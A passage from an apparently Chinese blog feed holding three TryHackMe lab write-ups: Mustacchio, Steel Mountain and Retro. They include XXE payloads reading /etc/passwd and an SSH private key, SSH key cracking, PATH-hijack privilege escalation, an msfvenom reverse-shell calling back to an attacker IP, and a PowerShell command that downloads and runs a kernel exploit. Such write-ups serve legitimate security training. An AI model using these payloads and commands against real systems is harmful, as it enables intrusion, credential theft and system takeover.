class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 15:02 CST</span><br><span class="line">Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 98.06% done; ETC: 15:07 (0:00:06 remaining)</span><br><span class="line">Stats: 0:05:45 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% done; ETC: 15:08 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.235.246</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)</span><br><span class="line">|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)</span><br><span class="line">|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">|_http-title: Mustacchio | Home</span><br><span class="line">8765/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Mustacchio | Login</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|specialized|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 3.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 5.4 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   275.52 ms 10.14.0.1</span><br><span class="line">2   355.01 ms 10.10.235.246</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 361.77 seconds</span><br></pre></td></tr></table></figure><p>可以看出开放了22，80，8765端口</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151010430-1583807408.png" alt="image-20241015150958963"></p><p>扫描下目录</p><p><code>gobuster dir -u http://10.10.235.246/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151712711-928501733.png" alt="image-20241015151701655"></p><p>发现有个<code>robots.txt</code>，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151751823-1230137278.png" alt="image-20241015151741043"></p><p>没啥东西，继续查看其他目录文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152256352-1632797138.png" alt="image-20241015152243976"></p><p>在<code>/custom/js/</code>下找到<code>users.bak</code>文件，像是备份文件，下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152858740-1160933654.png" alt="image-20241015152847711"></p><p>看起来像是数据库中的数据，这里有admin的加密密码，尝试破解一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153033461-1519619990.png" alt="image-20241015153022188"></p><p>利用<code>john</code>成功获取到admin用户的明文密码<code>bulldog19</code></p><h2 id="8765端口"><a href="#8765端口" class="headerlink" title="8765端口"></a>8765端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151929654-275177714.png" alt="image-20241015151918464"></p><p>像是admin后台登陆页面</p><p>使用之前获取到的用户名密码尝试登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153202210-1089947038.png" alt="image-20241015153151381"></p><p>成功登录</p><p>像是添加内容的一个页面，查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153411288-847205401.png" alt="image-20241015153400373"></p><p>又得到两个重要提示，一个是另一个bak文件，一个提示我们可以使用ssh连接Barry用key，但是我们目前还没有Barry用户的key</p><p>先看下bak文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153629081-249297029.png" alt="image-20241015153618211"></p><p>内容有点像之前添加内容的格式，尝试添加一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153834233-1962745226.png" alt="image-20241015153823235"></p><p>发现格式正确，可以试下其他的内容，测试是否存在xxe漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154132533-1313842141.png" alt="image-20241015154121078"></p><p>发现能够读取<code>/etc/passwd</code>文件，我们就可以尝试读取<code>Barry</code>用户的ssh私钥来登录该用户</p><h1 id="SSH获取user权限"><a href="#SSH获取user权限" class="headerlink" title="SSH获取user权限"></a>SSH获取user权限</h1><p>首先确定好私钥的绝对路径</p><p><code>/home/barry/.ssh/id_rsa</code></p><p>构造恶意内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/barry/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154516232-8958968.png" alt="image-20241015154505258"></p><p>成功读取到私钥，将其保存至<code>id_rsa</code>文件<strong>（注意格式）</strong>，并赋予<code>600</code>权限，爆破加密私钥的密码</p><p>利用ssh通过私钥登录的方式常熟登录Barry用户</p><p>先将<code>id_rsa</code>转换成hash格式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155431516-1174663865.png" alt="image-20241015155420384"></p><p>使用john爆破密码</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155556279-2034530019.png" alt="image-20241015155545683"></p><p>发现密码<code>urieljames</code>，使用私钥登录ssh</p><p><code>ssh barry@10.10.235.246 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155820199-1962063428.png" alt="image-20241015155809630"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155843741-2084925548.png" alt="image-20241015155833241"></p><p>在当前目录下找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><h2 id="寻找提权目标"><a href="#寻找提权目标" class="headerlink" title="寻找提权目标"></a>寻找提权目标</h2><p>使用<code>sudo -l</code>试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160125542-1414416860.png" alt="image-20241015160114807"></p><p>发现用不了，再试试find命令</p><p><code>find / -type f -perm -u=s 2&gt;/dev/null</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160354842-450932405.png" alt="image-20241015160335569"></p><p>大多数命令都无法利用，但是发现有个不同的文件<code>/home/joe/live_log</code>，可以查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161626529-819413202.png" alt="image-20241015161615266"></p><p>发现是一个elf文件，运行一下试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161654143-1177441879.png" alt="image-20241015161642992"></p><p>发现是打印网站的日志的功能</p><p>使用strings检查一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015162050015-1226680986.png" alt="image-20241015162039262"></p><p>检查后发现这个文件在执行的时候会调用<code>tail</code>命令，我们就可以通过劫持该命令进行提权</p><h2 id="劫持环境变量提权"><a href="#劫持环境变量提权" class="headerlink" title="劫持环境变量提权"></a>劫持环境变量提权</h2><p>具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /tmp/tail</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; /tmp/tail</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/tail</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163243415-624662868.png" alt="image-20241015163231776"></p><p>再运行时，就会按照顺序执行我们构造的<code>tail</code>命令，导致权限提升</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163323308-831948752.png" alt="image-20241015163312818"></p><p>成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163355336-310839046.png" alt="image-20241015163344478"></p><p>在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Mustacchio</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Steel Mountain</title>
    <link href="https://ya1orin.github.io/posts/e8bded00.html"/>
    <id>https://ya1orin.github.io/posts/e8bded00.html</id>
    <published>2024-10-14T08:27:58.000Z</published>
    <updated>2024-11-13T05:19:26.829Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.51.252</p></blockquote><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014163927698-310950412.png" alt="image-20241014163917459"></p><p>开放若干端口，但是可以看出这是一台windows主机</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014164050700-679057908.png" alt="image-20241014164041162"></p><p>一个普通的页面，扫下目录</p><p><code>gobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014170550004-1267980203.png" alt="image-20241014170540647"></p><p>没什么有用信息</p><p>查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191706066-655513886.png" alt="image-20241014191656687"></p><p>找到人名<code>BillHarper</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><code>smbclient -L //10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191226841-505937933.png" alt="image-20241014191217373"></p><p>不允许匿名登录</p><h2 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191537845-1876392148.png" alt="image-20241014191528445"></p><p>发现是一个文件服务器版本号是<code>2.3</code>，点进去看看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014192448714-1892990057.png" alt="image-20241014192438848"></p><p>到这里就知道这个服务器的名字了<code>Rejetto HTTP File Server</code></p><p>可以尝试去网上找找是否有历史漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193542336-1095577421.png" alt="image-20241014193532643"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193635486-838603181.png" alt="image-20241014193625312"></p><p>找到个<code>CVE-2014-6287</code></p><h1 id="获取初始访问权限"><a href="#获取初始访问权限" class="headerlink" title="获取初始访问权限"></a>获取初始访问权限</h1><p>启动msf</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193829983-1899085758.png" alt="image-20241014193820488"></p><p>直接搜索这个cve并使用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014194006026-989143443.png" alt="image-20241014193956689"></p><p>把必要的参数设置一下</p><p>直接run！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195051743-599602628.png" alt="image-20241014195042124"></p><p>获得基础用户权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195133488-1609533962.png" alt="image-20241014195123919"></p><p>在<code>C:\Users\bill\Desktop</code>找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a>的<code>PowerShell</code>脚本来查看这台 Windows 机器并确定目标机是否存在任何异常和错误配置</p><p>将文件保存到本地，通过msf传上去</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200155434-17085404.png" alt="image-20241014200146045"></p><p>可以通过<code>meterpreter</code>会话来加载<code>PowerShell</code>扩展，并进入 <code>PowerShell</code>的shell界面并执行脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200617323-413379229.png" alt="image-20241014200607720"></p><p>发现有个特别的服务<code>CanRestart</code>选项被设置为<code>true</code>，当这个选项为<code>true</code>时，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行</p><blockquote><p>ServiceName ：AdvancedSystemCareService9</p><p>ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p></blockquote><p><code>msfvenom</code>可用于生成反向shell的payload并将其输出为<code>windows</code>可执行文件，我们用<code>msfvenom</code>来生成一个和之前的应用程序同名的恶意应用程序:</p><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.14.90.122 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe</code></p><p>在 <code>meterpreter</code> 中上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201549634-483647248.png" alt="image-20241014201539989"></p><p>进入shell，先将这个服务停掉，替换我们的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">sc</span> stop AdvancedSystemCareService9</span><br><span class="line"><span class="built_in">copy</span> ASCService.exe <span class="string">&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201806112-808045312.png" alt="image-20241014201756699"></p><p>关于SC命令（Windows shell不区分大小写）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SC</span>命令的格式：<span class="built_in">SC</span> [<span class="type">Servername</span>] command Servicename [<span class="type">Optionname</span>= <span class="type">Optionvalues</span>]</span><br><span class="line"></span><br><span class="line">Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。</span><br><span class="line">command ：如query,<span class="built_in">start</span>,stop,create,config等</span><br><span class="line"></span><br><span class="line">Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入<span class="built_in">sc</span> <span class="built_in">start</span> +你要启动的服务名称（并非是服务显示名称）。</span><br><span class="line">Optionname= Optionvalues：是选项名和选项的值。</span><br></pre></td></tr></table></figure><p>在重启服务之前，在我们的机器上先启动个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201838886-990526090.png" alt="image-20241014201829234"></p><p>然后在靶机中重启服务</p><p><code>sc start AdvancedSystemCareService9</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201912815-1720693336.png" alt="image-20241014201903513"></p><p>这时就提升到了root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014202038317-726923127.png" alt="image-20241014202028946"></p><p>在<code>C:\Users\Administrator\Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Steel Mountain</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://ya1orin.github.io/tags/Windows/"/>
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Retro</title>
    <link href="https://ya1orin.github.io/posts/70f6e376.html"/>
    <id>https://ya1orin.github.io/posts/70f6e376.html</id>
    <published>2024-10-12T03:46:11.000Z</published>
    <updated>2024-11-13T05:19:23.306Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.52.12</p></blockquote><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>注意：机器不响应ping命令</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p> <code>nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12</code></p><p>这里使用<code>-Pn</code>参数绕过ping命令的检查</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012124425580-746515289.png" alt="image-20241012124417135"></p><p>发现只开放了80和3389端口，这意味着当我们拿到一组凭据后，可以通过 rdp登录目标主机</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012125109670-1625718676.png" alt="image-20241012125102563"></p><p>是一个<code>windows server</code>默认的IIS服务</p><p>扫描一下目录</p><p><code>gobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012141145765-33043048.png" alt="image-20241012141138353"></p><p>访问一下<code>/retro</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143041958-931600745.png" alt="image-20241012143034753"></p><p>在页面最下面发现文章<code>Ready Player One</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143406701-1000163975.png" alt="image-20241012143359676"></p><p>根据文章意思猜测这是一组登录凭据<code>Wade : parzival</code></p><h1 id="RDP登录远程主机"><a href="#RDP登录远程主机" class="headerlink" title="RDP登录远程主机"></a>RDP登录远程主机</h1><p>拿到一组用户凭据，结合之前的3389端口开放，尝试登录</p><p><code>xfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143946216-981286449.png" alt="image-20241012143938820"></p><p>登陆成功</p><p>并在桌面找到user.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144100422-25041175.png" alt="image-20241012144053438"></p><h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><p>先进行windows主机信息搜集</p><p>桌面上有个浏览器，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144614643-1652594324.png" alt="image-20241012144607785"></p><p>发现该用户收藏了一个cve的页面，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144928489-1007257350.png" alt="image-20241012144921303"></p><p>是<code>CVE-2019-1388</code></p><p>我们发现目标机的浏览器中有<code>CVE-2019-1388</code>的历史访问记录—猜测用户可能是想针对CVE-2019-1388漏洞打补丁，也就是说目标机器可能存在<code>CVE-2019-1388</code>漏洞</p><p>经过信息搜索可知<code>CVE-2019-1388</code>是一个UAC提权漏洞，该漏洞的基本信息如下：</p><blockquote><p><strong>UAC</strong>:用户帐户控制(User Account Control)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。</p><p><strong>CVE-2019-1388</strong>：该漏洞位于Windows的UAC（User Account Control，用户帐户控制）机制中。在默认情况下，Windows会在一个单独的桌面上显示所有的UAC提示 Secure Desktop；这些提示是由名为 consent.exe 的可执行文件产生的，该可执行文件以NT AUTHORITY\SYSTEM权限运行，完整性级别为System。</p><p>因为用户可以与该UI交互，因此对UI来说紧限制是必须的，否则，低权限的用户可能可以通过UI操作的循环路由以SYSTEM权限执行操作，即使隔离状态的看似无害的UI特征都可能会成为引发任意控制的动作链的第一步。</p><p><a href="https://github.com/jas502n/CVE-2019-1388">CVE-2019-1388漏洞利用</a></p></blockquote><h2 id="利用UAC漏洞提权"><a href="#利用UAC漏洞提权" class="headerlink" title="利用UAC漏洞提权"></a>利用UAC漏洞提权</h2><p>我们需要通过执行<code>hhupd.exe</code>文件来完成对CVE-2019-1388的利用，在目标机用户Wade 桌面上的回收站中我们可以找到<code>hhupd.exe</code>文件——我们手动恢复该文件即可</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145533318-1767894072.png" alt="image-20241012145525730"></p><p>右键单击hhupd.exe文件并选择以管理员身份运行它，然后先点击”显示更多详细信息”，再继续点击”显示有关发布者证书的信息”</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145637747-550169434.png" alt="image-20241012145630586"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145657684-1224412202.png" alt="image-20241012145647626"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145719391-978453998.png" alt="image-20241012145712577"></p><p><img src="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230308122357026-1060167176.png" alt="image"></p><blockquote><p>如果在上图界面中无法手动选择使用浏览器以打开链接—则需要我们重新部署一个目标机器并在通过RDP运行目标机上的hhupd.exe文件之前 先打开一个IE浏览器实例</p></blockquote><p>因为目标机器没有连接到互联网，所以我们将在<code>Internet Explorer</code>浏览器中看到以下界面（这并不影响漏洞利用过程），此处其实是以系统级别的权限来打开浏览器，我们继续按<code>Alt</code>键弹出程序菜单栏，然后单击”另存为…”</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150200066-2015236866.png" alt="image-20241012150152799"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150347911-676620041.png" alt="image-20241012150339873"></p><p>在弹出的窗口中输入<code>C:\Windows\System32\*.*</code>点击回车，定位到<code>System32</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150458156-990693367.png" alt="image-20241012150451317"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150545579-666682287.png" alt="image-20241012150538624"></p><p>然后在上面输入<code>cmd.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012150626890-48998100.png" alt="image-20241012150620038"></p><p>这里正常来说应该是可以提权成功的，但是我这里不知道是哪个步骤出错了，导致没有提权成功。。。</p><h2 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h2><p>通过<code>systeminfo</code>进行信息搜集</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012151549840-1471797610.png" alt="image-20241012151542920"></p><p>发现在这个版本下有 <code>CVE-2017-0213</code>漏洞</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213_x64.zip"> CVE-2017-0213漏洞利用</a></p><p>在kali机中下载以上 zip文件并通过<code>unzip</code>命令解压得到exe，然后传输该exe文件到靶机中，最后通过远程桌面直接执行该exe文件即可成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152613938-1409594014.png" alt="image-20241012152606663"></p><p>起一个python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012152654989-441442532.png" alt="image-20241012152648189"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在靶机cmd中使用Powershell的Invoke-WebRequest模块</span></span><br><span class="line">Powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">81</span>/CVE<span class="literal">-2017-0213_x64</span>.exe <span class="literal">-OutFile</span> exploit.exe</span><br><span class="line"></span><br><span class="line">.\exploit.exe</span><br><span class="line"><span class="comment">#执行漏洞利用exe之后，我们能看到该漏洞利用程序生成了一个新的CMD shell且权限为Administrator——提权成功。</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154001467-1487303658.png" alt="image-20241012153954000"></p><p>提权成功，拿到<code>system</code>权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012154050259-1805537077.png" alt="image-20241012154043442"></p><p>在<code>c:/Users/Administrator/Desktop</code>找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Retro</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
